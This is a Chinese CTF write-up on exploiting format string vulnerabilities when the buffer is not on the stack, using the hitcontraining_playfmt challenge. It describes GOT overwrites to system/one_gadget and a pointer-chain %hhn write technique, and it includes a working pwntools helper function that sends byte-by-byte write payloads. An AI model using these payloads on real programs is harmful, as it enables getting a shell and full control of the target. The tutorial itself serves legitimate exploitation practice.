非栈上格式化字符串漏洞概述

当printf(buf)中的buf不在栈上时，泄露地址和在栈上一样,但是任意地址写确不一样。这时候我们应该利用间接写的地址

A---->B---->C
C和D长的很像，像兄弟，于是来个偷天换日！
A---->B---->D

0xff8b0428 —▸ 0xff8b0438 —▸ 0x804a070
经过格式化字符串漏洞 利用，写双字节得到
0xff8b0428 —▸ 0xff8b0438 —▸ 0x804cb20

利用技巧

改写ret地址中的libc_start_main为one_gadget

改printf的got为system/one_gadget

例题

以hitcontraining_playfmt 为例，介绍这两种解题方法

保护检查

基本没有开启保护

IDA分析

int do_fmt()
{
  int result; // eax

  while ( 1 )
  {
    read(0, buf, 0xC8u);
    result = strncmp(buf, "quit", 4u);
    if ( !result )
      break;
    printf(buf);
  }
  return result;
}

存在格式化字符漏洞，但是buf不在栈上，这就需要利用以上所说的利用手法了。

漏洞利用

方法一

这种方式就是利用栈中现有的 .text 段内容，将目标地址（如printf_got)分成多段（一般为4份），在一次性修改目标地址为 system或one_gadget。最后取得shell。

方法二

参考链接：https://www.anquanke.com/post/id/184717#h2-7

下图是一个简单的栈地址空间图，offset表示格式化的参数位置。通过第offset0个参数，利用%hhn可以控制address1的最低位，再通过第offset1个参数，利用%hhn可以写address2的最低位；然后通过offset0参数，利用%hhn修改address1的最低位为原始值+1，再通过offset1参数，利用%hhn可以写address2的次低位；依次循环即可完全控制address2的值，再次利用address1和address2的链式结构，即可实现对address2地址空间的任意写。

该手法大多数情况下不能更改got表为system，因为要分四步去更改got表的内容，会造成地址无法解析（当然，如果你能提前在栈上构造好 got、got+2、got+4、got+6 四个不同的链，发送一次payload 就能将got表内容进行更改，也是可以更改got表的）。单字节修改时尾部字节在 0XFD-0XFF 时程序会失败，双字节修改时尾部字节在 0XFFFD-0XFFFF 时程序会失败。因此方法2不是最佳选择。但当 FULL RELRO 时 ，修改返回地址构造 ROP 链则相对简单一些。

还有一部分情况是程序开启了FULL RELRO ，这时候我们需要修改返回地址为one_gadget,或者去更改程序的返回地址（pop rdi ，binsh，system）getshell。此时第二种攻击方式比较方便，第一种方式修改的话过于繁杂。

def fmt_ch_one_byte(offset1, offset2, addr, data, dmite=""):
    '''
    单字节模式
    :param offset1:第一偏移位值，此内存保存第二个地址值
    :param offset2:第二个偏移值，此内存保存目标地址值
    :param addr:目标地址，
    :param data:写入的数据
    注意：此方法当目标地址的后2位在0xFD-0xFF时程序会失败，此时需要多试几次
    '''
    addr_4 = addr & 0xFF
    for i in range(8):
        if (addr_4 + i) == 0:
            payload = '%' + str(offset1) + '$hhn\x00'
        else:
            payload = '%' + str(addr_4 + i) + 'c%' + str(offset1) + '$hhn\x00'
        sleep(1)
        # pause()
        # sl(payload)
        p.sendline(payload)  # sl sla 需要根据情况调整
        data_t = (data >> i * 8) & 0XFF
        if data_t == 0:
            payload = '%' + str(offset2) + '$hhn\x00'
        else:
            payload = '%' + str(data_t) + 'c%' + str(offset2) + '$hhn\x00'
        sleep(1)
        # pause()
        # sl(payload)
        p.sendline(payload)  # sl sla 需要根据情况调整
    # 恢复offset2中存储的addr的最后1个字节
    payload = '%' + str(addr_4) + 'c%' + str(offset1) + '$hhn\x00'
    sleep(1)
    # sl(payload)
    p.sendline(payload)  # sl sla 需要根据情况调整

    '''
    单字节模式
    :param offset1:第一偏移位值，此内存保存第二个地址值
    :param offset2:第二个偏移值，此内存保存目标地址值
    :param addr:目标地址，
    :param data:写入的数据
    注意：此方法当目标地址的后2位在0xFD-0xFF时程序会失败，此时需要多试几次
    '''
